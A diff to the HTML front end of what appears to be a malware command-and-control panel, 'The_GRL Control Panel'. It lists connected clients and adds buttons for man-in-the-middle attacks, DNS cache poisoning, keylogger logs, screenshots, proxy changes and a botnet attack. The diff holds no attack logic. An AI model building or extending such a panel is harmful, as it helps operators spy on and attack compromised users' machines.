@@ -111,6 +111,19 @@
   
 <div class="container">
 
+<nav class="navbar navbar-inverse navbar-fixed-top">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <a class="navbar-brand" href="#">The_GRL Control Panel</a>
+    </div>
+    <ul class="nav navbar-nav">
+      <li class="active"><a href="#">Control Panel</a></li>
+    </ul>
+  </div>
+</nav>
+
+    <br/><br/>
+
   <div class="row">
     <h2>Connected clients</h2>
     <div class="col-sm-12" id="clients">    </div>
@@ -130,17 +143,35 @@
 
   <div class="row">
       <h3>Attacks</h3>
-    <div class="col-sm-4" id="operations">
-        <button id="mitm">Man In the Middle Attack</button><br/><br/>  
-        <button id="mitm">Poison DNS Cache</button> <br/> <br/> 
-        <button id="mitm">View Keylogger Logs</button> <br/> <br/> 
-        <button id="mitm">Edit DNS Resolver Cache</button> <br/> <br/> 
-        <button id="mitm">Change Proxy Settings</button> <br/> <br/> 
+    <div class="col-sm-12" id="operations">
+        <button id="mitmdo">Man In the Middle Attack</button><br/><br/>  
+        <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
     </div>
-    <div class="col-sm-4" id="operations">    </div>
-    <div class="col-sm-4" id="operations">    </div>
   </div>
 
+
+<div class="row">
+      <h3>Misc.</h3>
+    <div class="col-sm-4" id="operations">
+        <button id="screen">Screenshot</button> <br/> <br/> 
+        <button id="keylogger">View Keylogger Logs</button> <br/> <br/> 
+    </div>
+    <div class="col-sm-8" id="operations">    
+
+        <input id="ffip" placeholder="IP address"></input>
+        <input id="ffport" placeholder="Port"></input>
+        <button id="proxychange">Change Proxy Settings</button> <br/> <br/> 
+
+        <input id="botnetip" placeholder="IP address"></input>
+        <button id="botnet">Botnet Attack</button> <br/> <br/> 
+
+        <input id="resolvedit" placeholder="Enter text.."></input>
+        <button id="resolvview">View DNS Resolver Cache</button> <br/> <br/> 
+        <button id="resolvedit">Edit DNS Resolver Cache</button> <br/> <br/> 
+
+    </div>
+    <div class="col-sm-0" id="operations">    </div>
+  </div>
 
 
 
